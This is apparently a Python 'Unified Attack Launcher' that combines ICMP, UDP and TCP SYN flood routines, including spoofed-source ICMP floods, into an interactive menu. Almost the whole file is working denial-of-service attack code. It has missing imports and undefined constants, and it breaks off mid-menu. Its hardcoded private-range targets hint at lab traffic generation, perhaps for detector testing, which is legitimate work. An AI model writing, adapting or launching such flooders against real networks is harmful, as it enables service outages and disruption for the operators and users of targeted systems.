import os
import socket
import struct
import threading

# ============================================================
# ICMP FLOOD FUNCTIONS (from 3rd script)
# ============================================================
def checksum(data):
    total = 0
    countTo = (len(data) // 2) * 2
    count = 0
    while count < countTo:
        thisVal = data[count + 1] * 256 + data[count]
        total += thisVal
        total &= 0xffffffff
        count += 2
    if countTo < len(data):
        total += data[-1]
        total &= 0xffffffff
    total = (total >> 16) + (total & 0xffff)
    total += (total >> 16)
    return (~total) & 0xffff

def build_icmp_packet(pid, payload_size):
    header = struct.pack('bbHHh', 8, 0, 0, pid, 1)
    data = bytes(random.getrandbits(8) for _ in range(payload_size))
    my_checksum = checksum(header + data)
    header = struct.pack('bbHHh', 8, 0, socket.htons(my_checksum), pid, 1)
    return header + data

def build_ip_header(src_ip, dst_ip, payload_len):
    ver_ihl = (4 << 4) + 5
    total_length = 20 + payload_len
    identification = random.randint(0, 65535)
    ttl = 64
    protocol = socket.IPPROTO_ICMP
    checksum_ip = 0
    src_addr = socket.inet_aton(src_ip)
    dst_addr = socket.inet_aton(dst_ip)
    return struct.pack('!BBHHHBBH4s4s',
                       ver_ihl, 0, total_length,
                       identification, 0,
                       ttl, protocol, checksum_ip,
                       src_addr, dst_addr)

def standard_icmp_flood(target_ip, pps, payload_size=STANDARD_PAYLOAD_SIZE_ICMP):
    print(f"[+] Standard ICMP flood to {target_ip} at ~{pps} PPS with payload size {payload_size} bytes")
    threads = min(pps, 300)
    packets_per_thread = pps // threads
    leftover = pps % threads
    def worker(rate):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            print("❌ Run as root.")
            return
        pid = os.getpid() & 0xFFFF
        delay = 1.0 / rate if rate > 0 else 0
        while True:
            pkt = build_icmp_packet(pid, payload_size)
            try:
                sock.sendto(pkt, (target_ip, 0))
            except:
                continue
            if delay > 0:
                time.sleep(delay)
    for i in range(threads):
        r = packets_per_thread + (1 if i < leftover else 0)
        threading.Thread(target=worker, args=(r,), daemon=True).start()

def high_payload_flood(target_ip):
    size = random.choice([1440, 1450])
    print(f"[+] High-payload ICMP flood to {target_ip} with size {size}")
    standard_icmp_flood(target_ip, pps=1520, payload_size=size)

def spoofed_icmp_flood_from_subnet(target_ip, pps, subnet_str, payload_size=64):
    print(f"[+] Spoofed ICMP flood from subnet {subnet_str} at ~{pps} PPS")
    try:
        subnet = ipaddress.IPv4Network(subnet_str, strict=False)
        pool = list(subnet.hosts())
        if not pool:
            raise ValueError
    except:
        print("❌ Invalid subnet")
        return
    threads = min(pps, 300)
    packets_per_thread = pps // threads
    leftover = pps % threads
    def worker(rate):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except PermissionError:
            print("❌ Run as root.")
            return
        pid = os.getpid() & 0xFFFF
        prebuilt_icmp = build_icmp_packet(pid, payload_size)
        delay = 1.0 / rate if rate > 0 else 0
        while True:
            src_ip = str(random.choice(pool))
            ip_hdr = build_ip_header(src_ip, target_ip, len(prebuilt_icmp))
            pkt = ip_hdr + prebuilt_icmp
            try:
                sock.sendto(pkt, (target_ip, 0))
            except:
                continue
            if delay > 0:
                time.sleep(delay)
    for i in range(threads):
        r = packets_per_thread + (1 if i < leftover else 0)
        threading.Thread(target=worker, args=(r,), daemon=True).start()

def mixed_icmp_flood(target_ip, pps, subnet_str):
    print(f"[+] Mixed ICMP flood using subnet {subnet_str} at ~{pps} PPS")
    try:
        subnet = ipaddress.IPv4Network(subnet_str, strict=False)
        spoof_pool = [str(ip) for ip in subnet.hosts()]
        if not spoof_pool:
            raise ValueError
    except:
        print("❌ Invalid subnet")
        return
    threads = min(pps, 100)
    delay = 1.0 / (pps / threads)
    def worker():
        pid = os.getpid() & 0xFFFF
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            icmp_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            print("❌ Run as root.")
            return
        while True:
            mode = random.choice(['normal', 'high', 'spoofed'])
            if mode == 'normal':
                pkt = build_icmp_packet(pid, 64)
                try:
                    icmp_sock.sendto(pkt, (target_ip, 0))
                except:
                    continue
            elif mode == 'high':
                pkt = build_icmp_packet(pid, 2000)
                try:
                    icmp_sock.sendto(pkt, (target_ip, 0))
                except:
                    continue
            elif mode == 'spoofed':
                spoof_ip = random.choice(spoof_pool)
                pkt = build_icmp_packet(pid, 64)
                ip_hdr = build_ip_header(spoof_ip, target_ip, len(pkt))
                try:
                    raw_sock.sendto(ip_hdr + pkt, (target_ip, 0))
                except:
                    continue
            time.sleep(delay)
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

# ============================================================
# UDP FLOOD FUNCTIONS (from 2nd script)
# ============================================================
def send_udp_packet(target_ip, target_port, payload_size):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = bytes(random.getrandbits(8) for _ in range(payload_size))
        sock.sendto(payload, (target_ip, target_port))
    except:
        pass

def fixed_port_udp_flood(target_ip, pps):
    print(f"[+] Fixed-port UDP flood to {target_ip}:{DEFAULT_PORT_UDP} at {pps} PPS")
    threads = min(pps, MAX_THREADS_UDP)
    delay = 1 / (pps / threads)
    def worker():
        while True:
            send_udp_packet(target_ip, DEFAULT_PORT_UDP, STANDARD_PAYLOAD_SIZE_UDP)
            time.sleep(delay)
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def random_port_udp_flood(target_ip, pps):
    print(f"[+] Random port UDP flood to {target_ip} at {pps} PPS")
    threads = min(pps, MAX_THREADS_UDP)
    delay = 1 / (pps / threads)
    def worker():
        while True:
            port = random.randint(1, 65535)
            send_udp_packet(target_ip, port, STANDARD_PAYLOAD_SIZE_UDP)
            time.sleep(delay)
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def large_payload_udp_flood(target_ip, pps):
    print(f"[+] Large payload UDP flood to {target_ip}:{DEFAULT_PORT_UDP} at {pps} PPS")
    threads = min(pps, MAX_THREADS_UDP)
    delay = 1 / (pps / threads)
    def worker():
        while True:
            send_udp_packet(target_ip, DEFAULT_PORT_UDP, LARGE_PAYLOAD_SIZE_UDP)
            time.sleep(delay)
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

def mixed_udp_flood(target_ip, pps):
    print(f"[+] Mixed anomaly UDP flood to {target_ip} at {pps} PPS")
    threads = min(pps, MAX_THREADS_UDP)
    delay = 1 / (pps / threads)
    def worker():
        while True:
            port = random.choice([DEFAULT_PORT_UDP, random.randint(1, 65535)])
            size = random.choice([STANDARD_PAYLOAD_SIZE_UDP, LARGE_PAYLOAD_SIZE_UDP])
            send_udp_packet(target_ip, port, size)
            time.sleep(delay)
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

# ============================================================
# TCP SYN FLOOD FUNCTIONS (from 1st script)
# ============================================================
def attack_feature1_high_pps_fixed_port(pps=200):
    interval = 1.0 / pps
    payload = b"A" * 216
    base_pkt = IP(dst=TARGET_IP_TCP)/TCP(sport=12345, dport=TARGET_PORT_TCP, flags="S")
    while True:
        pkt = base_pkt/payload
        pkt[TCP].seq = random.randint(1000, 9999)
        send(pkt, verbose=0)
        time.sleep(interval)

def attack_feature2_unique_ports_high_rate(pps=200):
    interval = 1.0 / pps
    payload = b"B" * 216
    while True:
        pkt = IP(dst=TARGET_IP_TCP)/TCP(
            sport=random.randint(1024, 65535),
            dport=TARGET_PORT_TCP,
            flags="S",
            seq=random.randint(1000, 9999))
        send(pkt/payload, verbose=0)
        time.sleep(interval)

def attack_feature3_low_packet_size_burst(pps=2000, burst_size=50):
    interval = 1.0 / pps
    while True:
        for _ in range(burst_size):
            pkt = IP(dst=TARGET_IP_TCP)/TCP(
                sport=3456,
                dport=TARGET_PORT_TCP,
                flags="S",
                seq=random.randint(1000, 9999))
            send(pkt/os.urandom(random.randint(10, 60)), verbose=0)
        time.sleep(interval)

def attack_feature4_mixed_all():
    def worker():
        while True:
            pkt = IP(dst=TARGET_IP_TCP)/TCP(
                sport=random.randint(1024, 65535),
                dport=TARGET_PORT_TCP,
                flags="S",
                seq=random.randint(1000, 9999))
            send(pkt/os.urandom(45), verbose=0)
            time.sleep(0.0025)
    for _ in range(100):
        threading.Thread(target=worker, daemon=True).start()
    while True:
        time.sleep(1)

# ============================================================
# MAIN MENU
# ============================================================
if __name__ == "__main__":
    print("""
🔥 Unified Attack Launcher
===========================
1. ICMP Flood
2. UDP Flood
3. TCP SYN Flood
""")
    proto = input("Choose protocol (1/2/3): ").strip()

    if proto == '1':
        target_ip = random.choice(["192.169.0.33", "172.19.0.33"])
        print("""
ICMP Flood Variants:
1. Standard ICMP Flood
2. High Payload ICMP Flood
3. Spoofed ICMP Flood (from Subnet)
4. Mixed ICMP Flood
""")
        choice = input("Choose variant (1-4): ").strip()
        if choice == '1':
            standard_icmp_flood(target_ip, pps=DEFAULT_PPS_ICMP, payload_size=STANDARD_PAYLOAD_SIZE_ICMP)
        elif choice == '2':
            high_payload_flood(target_ip)
        elif choice == '3':
            pps = 1000
            subnets = ["10.10.0.0/16", "11.20.0.0/16", "12.30.0.0/16", "14.40.0.0/16"]
            subnet = random.choice(subnets)
            spoofed_icmp_flood_from_subnet(target_ip, 1750, subnet)
        elif choice == '4':
            pps = DEFAULT_PPS_ICMP
            subnets = ["10.10.0.0/16", "11.20.0.0/16", "12.30.0.0/16", "14.40.0.0/16"]
            subnet = random.choice(subnets)
            mixed_icmp_flood(target_ip, 2000, subnet)
        else:
            print("❌ Invalid choice")
            exit(1)

    elif proto == '2':
        target_ip = DEFAULT_TARGET_UDP
        print("""
